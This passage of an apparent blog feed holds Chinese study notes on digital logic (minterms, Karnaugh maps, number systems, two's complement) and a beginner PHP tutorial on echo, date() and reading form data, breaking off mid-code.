title="最小项的编号表示方法"></a>最小项的编号表示方法</h4><p>将最小项中的原变量用1表示，反变量用0表示，得到的二进制数转为十进制后对应的编码即为该最小项的编号。</p><p>最小项的起始编码为0，取值范围为0~2^n-1^。记作m<del>i</del>。</p><h4 id="最大项的定义"><a href="#最大项的定义" class="headerlink" title="最大项的定义"></a>最大项的定义</h4><p>在n变量逻辑函数中，若M为包含n个因子的和项，而这n个变量在和项中均以原变量或者反变量的形式出现且仅出现一次，那么M称作该组变量的<strong>最大项</strong></p><h4 id="最大项的编号表示方法"><a href="#最大项的编号表示方法" class="headerlink" title="最大项的编号表示方法"></a>最大项的编号表示方法</h4><p>编号方法与最小值相同，记为M<del>i</del>。</p><h4 id="最小项和最大项的性质"><a href="#最小项和最大项的性质" class="headerlink" title="最小项和最大项的性质"></a>最小项和最大项的性质</h4><p><strong>相邻性</strong>：若两个最小项&#x2F;最大项只有一个因子不同，则称他们具有相邻性。</p><p>对于最小项，相邻的两个最小项相加可以合并成一项，并消去差异因子。</p><p>对于最大项，相邻的两个最大项相乘可以合并成一项，并消去差异因子。</p><h3 id="逻辑函数的“最小项之和”形式-标准与或式"><a href="#逻辑函数的“最小项之和”形式-标准与或式" class="headerlink" title="逻辑函数的“最小项之和”形式&#x2F;标准与或式"></a>逻辑函数的“最小项之和”形式&#x2F;标准与或式</h3><p>全部由最小项构成的“积之和”表达式，称为最小项表达式。</p><p>任何逻辑函数都能化成一个<strong>唯一的</strong>标准与或式。</p><h3 id="逻辑函数的“最大项之和”形式-标准或与式"><a href="#逻辑函数的“最大项之和”形式-标准或与式" class="headerlink" title="逻辑函数的“最大项之和”形式&#x2F;标准或与式"></a>逻辑函数的“最大项之和”形式&#x2F;标准或与式</h3><p>全部由最大项构成的“和之积”表达式，称为最大项表达式。</p><p>任何逻辑函数都能化成一个<strong>唯一的</strong>标准或与式。</p><h3 id="标准或与式和标准与或式的关系"><a href="#标准或与式和标准与或式的关系" class="headerlink" title="标准或与式和标准与或式的关系"></a>标准或与式和标准与或式的关系</h3><p>M<del>i</del>&#x3D;m<del>i</del>‘。</p><p>由此可知，如果函数式可以由最小项之和表示，那么它一定也能由最大项之积来表示，它们两者是等价的。</p><h2 id="逻辑函数的化简方法"><a href="#逻辑函数的化简方法" class="headerlink" title="逻辑函数的化简方法"></a>逻辑函数的化简方法</h2><p>通过反复使用逻辑函数的运算公式来化简。</p><p>关于化最简的标准，其实要根据实际应用中提供的逻辑器件来决定。以使用电子器件数目最少，成本最低为判断最简的标准。默认最简形式为与或式，即只用与门和或门来实现电路。</p><p>最简与或式要求式子中与项数目最少，且乘积项中包含的变量数目最少。</p><h3 id="常用的公式化简方法"><a href="#常用的公式化简方法" class="headerlink" title="常用的公式化简方法"></a>常用的公式化简方法</h3><h3 id="卡诺图化简法"><a href="#卡诺图化简法" class="headerlink" title="卡诺图化简法"></a>卡诺图化简法</h3><p>卡诺图的思想源于两个相邻的最小项可以化简。</p><h4 id="认识卡诺图"><a href="#认识卡诺图" class="headerlink" title="认识卡诺图"></a>认识卡诺图</h4><p>将n变量的全部最小项各用一个小方格表示，并且使具有逻辑相邻性的最小项在几何位置上也相邻的排列起来，所得到的图形叫做<strong>n变量卡诺图</strong></p><h4 id="怎么用卡诺图表示逻辑函数"><a href="#怎么用卡诺图表示逻辑函数" class="headerlink" title="怎么用卡诺图表示逻辑函数"></a>怎么用卡诺图表示逻辑函数</h4><p>注意循环码，即变量之间的排序两两之间只有一位发生了变化，而不是递增排序。</p><p>卡诺图一般画成正方形或矩形。</p><p>在卡诺图中，凡是几何相邻的最小项，在逻辑上都是相邻的。</p><p>相接：紧挨着；相对：任意一行或一列的两头；相重：对折之后位置相重</p><h4 id="逻辑函数写卡诺图"><a href="#逻辑函数写卡诺图" class="headerlink" title="逻辑函数写卡诺图"></a>逻辑函数写卡诺图</h4><ul><li>首先把画出一个正方形或矩形表格，n变量的卡诺图有2^n^个小方格。</li><li>然后把变量分为两组，如AB&#x2F;CD。</li><li>按循环码循环给变量取值排序。比如00、01、11、10。</li><li>随后根据逻辑函数填表，若逻辑函数不是标准与或式则化为标准与或式。在逻辑函数包含的最小项在卡诺图对应的方格填1，其余填0（一般省略0）</li><li>在卡诺图中几何相邻的最小项可以合并为一项并消去相异因子，从而达到化简的目的。</li><li>注意，上述<strong>几何相邻</strong>的意义为相邻、对折相邻、上下角相邻，左右角相邻。</li><li>将所有相邻的1圈起来，圈越大越好；一个方格可以被多个圈入，但必须要有新的1在圈内，否则该圈为多余。</li><li>当0比较多的时候，也可以选择将所有0圈起来写出Y’，再取反得到答案。</li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这节内容主要介绍了一些逻辑运算的方法，以及一些运算规则和化简方法。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/301684.jpg" alt="301684"></p>]]></content>
    
    
    <summary type="html">介绍了逻辑电路的相关知识</summary>
    
    
    
    <category term="课堂随笔" scheme="http://example.com/categories/%E8%AF%BE%E5%A0%82%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="数字逻辑" scheme="http://example.com/tags/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/"/>
    
  </entry>
  
  <entry>
    <title>数字逻辑小结（一）——数制基础</title>
    <link href="http://example.com/2023/10/07/%E8%AF%BE%E5%A0%82%E9%9A%8F%E7%AC%94/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E5%B0%8F%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E5%88%B6%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2023/10/07/%E8%AF%BE%E5%A0%82%E9%9A%8F%E7%AC%94/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E5%B0%8F%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E5%88%B6%E5%9F%BA%E7%A1%80/</id>
    <published>2023-10-07T03:18:22.000Z</published>
    <updated>2023-10-17T16:13:59.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数制"><a href="#数制" class="headerlink" title="数制"></a>数制</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>数字系统中的各种信号以<strong>数码</strong>形式给出</p><p>数码包括：数量大小、不同的事物</p><p>其中数量大小和<strong>数制</strong>有关：十进制、二进制、八进制、十六进制等</p><p>不同的事物和<strong>编码形式</strong>有关：ASCII码等</p><h3 id="十进制"><a href="#十进制" class="headerlink" title="十进制"></a>十进制</h3><ul><li>每一位的构成：0~9</li><li>进位规则：逢十进一</li></ul><p>如（209.04）<del>10</del>&#x3D;2×10^2^+0×10^1^+9×10^0^+0×10^-1^+4×10^-2^</p><p>各位数的权是10的幂</p><h3 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h3><ul><li>构成：0、1</li><li>进位规则：逢二进一</li></ul><p>各位数的权是2的幂</p><h3 id="八进制"><a href="#八进制" class="headerlink" title="八进制"></a>八进制</h3><ul><li>构成：0~7</li><li>进位规则：逢八进一</li></ul><h3 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h3><ul><li>构成：0-9、A-F</li><li>进位规则：逢十六进一</li></ul><h2 id="数制转换"><a href="#数制转换" class="headerlink" title="数制转换"></a>数制转换</h2><h3 id="二进制转八进制"><a href="#二进制转八进制" class="headerlink" title="二进制转八进制"></a>二进制转八进制</h3><p>将二进制数由小数点开始，整数部分向左，小数部分向右，每3位一组，不够三位补零，则每组二进制数就是一位八进制数。<strong>“3对1”</strong></p><h3 id="八进制转二进制"><a href="#八进制转二进制" class="headerlink" title="八进制转二进制"></a>八进制转二进制</h3><p>即将每一位八进制数用3位二进制数表示。<strong>“1对3”</strong></p><h3 id="二进制转十六进制"><a href="#二进制转十六进制" class="headerlink" title="二进制转十六进制"></a>二进制转十六进制</h3><p>同上，每4位分一组，不够4位补零。<strong>“4对1”</strong></p><h3 id="十六进制转二进制"><a href="#十六进制转二进制" class="headerlink" title="十六进制转二进制"></a>十六进制转二进制</h3><p>同上，每一位十六进制数转4位二进制数。<strong>“1对4”</strong></p><h3 id="十进制转二进制"><a href="#十进制转二进制" class="headerlink" title="十进制转二进制"></a>十进制转二进制</h3><p>将整数部分和小数部分分别进行转换，转换后合并。</p><p>整数部分<strong>除以二取余</strong>；后得到的部分为高位。</p><p>小数部分<strong>乘以二取整</strong>；先得到的部分为高位。小数部分在不能精确转换的情况下，可以根据精度要求进行若干次乘以2的运算后结束转换。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>N进制转换为十进制：权值相加法</li><li>十进制转化为N进制：求余法；转二进制时直接辗转相除取余数，转8、16进制时常常先转二进制后再转其他进制方便计算。</li><li>N（2、8、16）进制之间的转换，每三位或者四位放在一起，借助十进制的权值相加法计算</li></ol><h2 id="二进制的算术运算"><a href="#二进制的算术运算" class="headerlink" title="二进制的算术运算"></a>二进制的算术运算</h2><p>二进制的算术运算中的加减乘除都可以由移位和相加两种操作来完成，这使得电路结构得到大大简化。</p><ul><li>加法计算 逢二进一</li><li>减法计算 借一当二</li><li>乘法运算 乘数左移、相加</li><li>除法运算 除数右移、相减</li></ul><h2 id="原码、反码和补码"><a href="#原码、反码和补码" class="headerlink" title="原码、反码和补码"></a>原码、反码和补码</h2><p>二进制数的正负号也是用0、1来表示：正数为0，负数为1。</p><p>当我们按照这个规则时，(1)<del>B</del>&#x3D;0001，(-1)<del>B</del>&#x3D;1001，但是它们二进制相加时明显不为0，因为它们采用的是<strong>混合编码</strong>。</p><p>因此我们需要采用<strong>补码</strong>，即将这个数的二进制取反再加1。</p><p>此时(1)<del>B</del>的补码定义为(-1)<del>B</del>&#x3D;1110+0001&#x3D;1111。易知此时二进制相加为0。</p><p>而<strong>反码</strong>即简单的将二进制数各位取反。</p><ol><li>原码：由符号位和数值位组成，正数符号位为0，负数符号位为1.</li><li>补码：正数的补码&#x3D;&#x3D;原码；负数的补码&#x3D;&#x3D;反码+1</li><li>补码算原码：减1求反码；求补码的补码。</li></ol><p><strong>注意</strong>：负数的补码取反时仅取数值位反码，符号位不变。</p><h2 id="利用补码实现减法运算"><a href="#利用补码实现减法运算" class="headerlink" title="利用补码实现减法运算"></a>利用补码实现减法运算</h2><p>减去某个数可以用加上他的补码来代替。</p><p>结果的符号等于两个加数的符号位和来自最高有效数字为的进位三者相加的结果。</p><p><strong>注意</strong>：使用二进制补码进行加减运算时得到的结果仍为补码，如果结果为正数可以不作处理，如果结果为负数记得取补码的补码得到负数的原码。</p><p>另外，将两数写成补码时，数值部分所取位数必须足以表示和的最大值，否则计算结果会出现溢出错误。</p><p><strong>BCD码（Binary Code Decimal）</strong></p><p><strong>格雷码</strong></p><p><strong>ASCII码</strong></p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>本节笔记主要摘录了数字逻辑的概论部分，内容较简单。然后介绍了进制基础和二进制的一些基本运算规则，需要重点掌握。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/2b4ac66703d6f4f4f42296696389284f.jpg" alt="2b4ac66703d6f4f4f42296696389284f"></p>]]></content>
    
    
    <summary type="html">学习数字逻辑的小笔记</summary>
    
    
    
    <category term="课堂随笔" scheme="http://example.com/categories/%E8%AF%BE%E5%A0%82%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="数字逻辑" scheme="http://example.com/tags/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/"/>
    
  </entry>
  
  <entry>
    <title>PHP碎碎念（一）——开始入门！</title>
    <link href="http://example.com/2023/09/22/PHP%E5%AD%A6%E4%B9%A0/PHP%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E5%BC%80%E5%A7%8B%E5%85%A5%E9%97%A8%EF%BC%81/"/>
    <id>http://example.com/2023/09/22/PHP%E5%AD%A6%E4%B9%A0/PHP%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E5%BC%80%E5%A7%8B%E5%85%A5%E9%97%A8%EF%BC%81/</id>
    <published>2023-09-21T16:34:41.000Z</published>
    <updated>2023-11-07T15:26:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>依旧是无可救药的一天……在开始正文之前请容我小小的吐槽一下。</p><p>CTF吧，真的是个巨坑。</p><p>一开始选的web和misc，结果选这个方向的人太多找不到其他方向的人组队……形势所迫，只好自己看看能不能全栈或者换个方向下手。一开始想试试pwn，结果pwn要求有逆向基础，又想去试试逆向，结果逆向又要求有汇编语言基础，好巧不巧的是汇编语言的书籍刚好给人借走了……好了，毫无疑问这也是个坑，不过汇编早晚都得学，倒也不是什么大问题。但是现在又只能暂时转向web了，无奈，先从之前的SQL注入入手吧。但是没有MySQL基础去学注入实在是看天书，那去学学MySQL？巧了，MySQL要求PHP基础，PHP又要求HTML&#x2F;CSS基础（所幸上学期已经学过前端三件套了），于是乎，又得先从PHP开始学起，还有一大堆协议等着，又是个巨坑……</p><p>实在是……受不了一点</p><p>好了，闲话到此打住，先来归纳一下今天学习PHP的一些笔记吧，姑且当做我的碎碎念好了。</p><p>那么，正文开始。</p><hr><p>我参考的书是《PHP和MySQL Web开发》，同时参考了部分菜鸟驿站的内容<a href="https://www.runoob.com/php/php-tutorial.html">PHP 教程 | 菜鸟教程 (runoob.com)</a>。有兴趣的可以自行查看，适合快速预习。</p><h2 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h2><p>首先我们先对PHP做一个大概的综述，方便更好的理解这门语言。</p><p>在开发一个网站时，一般都是先用HTML搭建起一个大致的框架，然后用CSS美化网页属性，最后用JavaScript实现一些更复杂的用户交互功能。但是，学会这些基本上只能搭建一个<strong>静态网页</strong>，也就是说，用户不能与网站产生任何互动（也许JS除外？），每一次网页的更新都必须依靠与重写其底层的HTML代码。那么我们要如何搭建起一个<strong>动态页面</strong>来实现更加丰富的网页功能呢？答案是使用PHP。</p><p>PHP是一个服务器端脚本代码，它能接收网页传递给服务器的数据，并在后端处理数据并将其发送到网页来实现内容的更新。最经典的操作就是处理表单，比如，处理一个在线购物的购物车订单。</p><p>PHP的学习其实并不难（至少书上是这么说的），如果你有过C&#x2F;C++、Python等其他编程语言基础，要上手PHP其实挺快的。PHP存在大量的函数和语句功能和C相同，基本上就是一通百通的道理（果然C是万物之母）。这里主要介绍一些PHP语言特有的属性，和C雷同的地方就略过了，也就是说，阅读这篇文章已经默认了你已经有了一定的C语言基础，不过要求也没那么高，只要掌握一些最基本的C语法就可以上手。</p><p>那么介绍到此为止，我们开始讲解PHP的语法。</p><h2 id="万物源头之hello-world"><a href="#万物源头之hello-world" class="headerlink" title="万物源头之hello world"></a>万物源头之hello world</h2><p>这里在书中给出了一个HTML制作的静态订单网站搭配PHP进行讲解，但是很遗憾我没有这本书的电子书资源，而且我也不想手撸一个HTML网页，所以这里我选择介绍菜鸟教程的内容。</p><p>在编程中，每每开始学习一门新语言，先输出一个hello world是传统，比如C的<code>printf(&quot;Hello, world&quot;);</code>。那么，在PHP中我们要怎么发扬传统呢？下面是我们编写的第一个PHP语句。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, world&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里就有许多需要讲解的地方了。</p><h3 id="PHP语句的格式"><a href="#PHP语句的格式" class="headerlink" title="PHP语句的格式"></a>PHP语句的格式</h3><p>如你所见，在执行输出函数的主体外，套着一个&lt; ?php … ?&gt;，以小于号开始，以大于号结束。这是PHP代码块的标志，即使是在PHP文件中，在标志外的代码仍然会被识别为HTML，只有代码块内的PHP语言才能被正确解释。所以，所有的PHP语句都必须在标志内编写。</p><p>值得一提的是这种风格有它自己的名字，叫做XML风格，是最为推荐也是最通用的风格。简短风格则是可以省开头的‘php’，但是不推荐。</p><h3 id="echo是什么？"><a href="#echo是什么？" class="headerlink" title="echo是什么？"></a>echo是什么？</h3><p>在PHP中一般使用echo来回显内容，使用方法如上。在echo后接你想要回显的值，如果是字符串需要加上双引号，且末尾用分号表示语句结束（这一点很像C语言）。</p><p>当然用print也能实现同样的功能，区别在于echo无返回值且速度更快，而print会返回1且不支持输出多条语句。在使用echo和print时，可以加括号也可以不加括号，因为echo和print都不是真正的函数。</p><h3 id="关于空格"><a href="#关于空格" class="headerlink" title="关于空格"></a>关于空格</h3><p>可以看到，echo前自动加上了一段缩进。</p><p>但是需要声明的是，不同于Python，PHP和HTML一样对空格和缩进不敏感。也就是说，PHP解释器会自动删掉语句间的空格和缩进，这些对语句的执行没有影响。但我们还是推荐在编程时使用缩进和空格，因为这可以提高代码可读性。</p><h3 id="关于注释"><a href="#关于注释" class="headerlink" title="关于注释"></a>关于注释</h3><p>PHP的注释有几种形式，基本是C和Python的大糅合。你可以使用<code>//</code>或者<code>/**/</code>来进行注释，也可以使用Python风格的<code>#</code>来注释，这些注释都不会被执行。</p><h2 id="来添加一个动态内容吧"><a href="#来添加一个动态内容吧" class="headerlink" title="来添加一个动态内容吧"></a>来添加一个动态内容吧</h2><p>上面我们用PHP实现了计算机界的祖传手艺，但这还是静态的啊，和我们一开始说好的不一样啊。所以我们现在尝试用PHP实现一个动态内容，我们将调用date()函数，来显示当前的时间。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;The time is&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&#x27;H:i, jS F Y&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">以下代码是等价的</span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;p&gt;The time is&quot;.date(&#x27;H:i, jS F Y&#x27;).&quot;&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>小朋友，你是否有很多问号？别急，让我们来逐步探索它背后的真相。</p><h3 id="date-函数？！"><a href="#date-函数？！" class="headerlink" title="date()函数？！"></a>date()函数？！</h3><p>在这个代码中，我们是这样调用date()函数的<code>date(&#39;H:i, jS F Y&#39;)</code>。很明显，我们向函数传递了一个格式化字符串变量。这个变量中，H代表小时，i是分钟，j代表该月的日期，s表示顺序后缀（在这里也就是‘th’），F代表月份，Y则是年份。</p><p>如果你发现运行代码给出的时间与现在不一致，大概率是你没有调整时区，如何设置时区，请自行上网询问度娘。</p><h3 id="为什么等价？"><a href="#为什么等价？" class="headerlink" title="为什么等价？"></a>为什么等价？</h3><p>在PHP中，（.）是连接操作符，通过使用 . ，我们可以连接起不同的语句和变量，将他们一起输出。</p><h3 id="怎么还有奇怪的"><a href="#怎么还有奇怪的" class="headerlink" title="怎么还有奇怪的&lt;p&gt;?"></a>怎么还有奇怪的&lt;p&gt;?</h3><p>学过HTML的小朋友都知道，这个是段落的标志。没错，PHP会自动渲染HTML语言并把它显示在网页上，配合的相当不错。</p><h2 id="如何访问表单变量"><a href="#如何访问表单变量" class="headerlink" title="如何访问表单变量"></a>如何访问表单变量</h2><p>好了，前面我们提到PHP最常用来做的事就是实现订单，那么我们要如何操作呢？</p><p>为了详细解释这个知识点，我不得不花了两分钟去网上找到了这本书的电子版资源……（太痛苦了），然后把表单的HTML代码粘贴如下。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="comment">&lt;!--总之注意body部分--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;processorder.php&quot;</span><span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="comment">&lt;!--注意action的取值指向了一个php文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">&quot;#cccccc&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span>&gt;</span>Item<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;15&quot;</span>&gt;</span>Quantity<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Tires<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span><span class="attr">name</span>=<span class="string">&quot;tireqty&quot;</span><span class="attr">size</span>=<span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">maxlength</span>=<span class="string">&quot;3&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!--注意这个文本框的名字！！--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Oil<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span><span class="attr">name</span>=<span class="string">&quot;oilqty&quot;</span><span class="attr">size</span>=<span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">maxlength</span>=<span class="string">&quot;3&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!--注意这个文本框的名字！！--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Spark Plugs<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span><span class="attr">name</span>=<span class="string">&quot;sparkqty&quot;</span><span class="attr">size</span>=<span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">maxlength</span>=<span class="string">&quot;3&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!--注意这个文本框的名字！！--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span><span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span><span class="attr">value</span>=<span class="string">&quot;Submit Order&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后我们得到了一个小小的可爱的订单。</p><p><img src="https://cdn.jsdelivr.net/gh/Adam8en/blogImage/images/20230922001812.png"></p><center>很可爱吧</center><p>显然，这个表单的目的是接收用户输入的值，然后将其提交给processorder.php文件（也就是表单的action属性指向的那个）。那么，我们要如何用PHP文件处理接受的值呢？</p><p>闲话少说，上代码！</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$tireqty</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;tireqty&#x27;</span>];</span><br><span class="line">    <span class="variable">$oilqty</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;oilqty&#x27;</span>];</span><br><span class="line">    <span class="variable">$sparkqty</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;sparkqty&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>打住，这里又出现了新情况，让我们细细道来。</p><h3 id="关于奇怪的"><a href="#关于奇怪的" class="headerlink" title="关于奇怪的$"></a>关于奇怪的$</h3><p>在PHP中，我们一般要在声明的变量前加$，不仅如此，在使用变量时也必须要加上$来告诉服务器这是个变量而非什么奇奇怪怪的东西。除此之外，还需要强调的一点是，PHP是一门弱类型语言，即不需要专门指定变量的类型而交给服务器自动匹配，与之相反的则是C语言的强类型。</p><p>关于声明变量，需要注意的是PHP区分变量大小写（但不区分函数的大小写），且变量名只能以下划线和字母开头，由下划线、字母和数字组成。</p><p>PHP有以下数据类型：</p><ul><li>String 字符串</li><li>Integer 整数</li><li>Float 浮点数</li><li>Boolean 布尔值</li><li>Array 数组</li><li>Object 对象</li><li>NULL 空</li><li>Resource 资源（一种特殊变量，保存了到外部资源的一个引用，比如MySQL）</li></ul><h3 id="关于奇怪的-POST"><a href="#关于奇怪的-POST" class="headerlink" title="关于奇怪的_POST"></a>关于奇怪的_POST</h3><p>我们注意到有<code>$_POST[&#39;tireqty&#39;]</code>，这东西很厉害，可是要怎么去理解它呢。</p><p>我们最开始的设想是用PHP去处理用户提交的表单信息，且其中一个文本框的名字就叫做’tireqty’。显然，这个代码的作用就是访问’tireqty’文本框的内容。<code>_POST</code>是一个数组，它包含了HTTP通过POST提交的所有数据，也就是文本框的method被设置为POST的情况。除此之外，我们还有<code>_GET</code>与<code>_REQUEST</code>。前者用于处理以GET形式提交的数据，而后者则用来处理POST和GET提交的数据总和。一般情况下，数据都可以通过<code>_REQUEST</code>来获得。</p><p>我们把通过这种方法获得的数组称为<strong>超级全局数组</strong>。</p><p>类似的超级全局数组还有以下几种：</p><ul><li>$GLOBALS，可以访问所有全局变量</li><li>$_SERVER，服务器环境变量数组</li><li>$_COOKIE，cookie变量数组</li><li>$_FILES，文件上传相关的变量数组</li><li>$_REQUEST，所有用户输入的变量数组，包括$_POST、$_GET、$_COOKIE所包含的输入内容（但是不包含$FILES）</li><li>$_ENV，环境变量数组</li></ul><h4 id="题外话：GET与POST"><a href="#题外话：GET与POST" class="headerlink" title="题外话：GET与POST"></a>题外话：GET与POST</h4><p>网页向服务器提交数据通常有两种方法，一种是将数据直接附加在链接后面发送给服务器，即GET。例如<code>https://adam8en.github.io?id=1</code>就是向网页传递了一个id&#x3D;1的数据。而POST数据则是将数据单独发出去，具体细节可以用burp suit抓包查看，通常不涉及到复杂的操作时用hackbar就可以很好的使用POST发送数据。</p><h3 id="如何回显收到的数据"><a href="#如何回显收到的数据" class="headerlink" title="如何回显收到的数据"></a>如何回显收到的数据</h3><p>一般来说，使用我们前文提到的输出hello world的方法就可以回显表单中提交的数据，即：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$tireqty</span>.<span class="string">&#x27;tires&lt;br /&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>但是我们并不推荐这种方式，因为我们没有对用户输入的数据进行检验，这可能会导致恶意用户输入恶意语句而引发安全性问题（终于有点安全的知识了），你应该对数据进行过滤，这里我们先使用另一种方法，即调用<code>htmlspecialchars()</code>函数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span 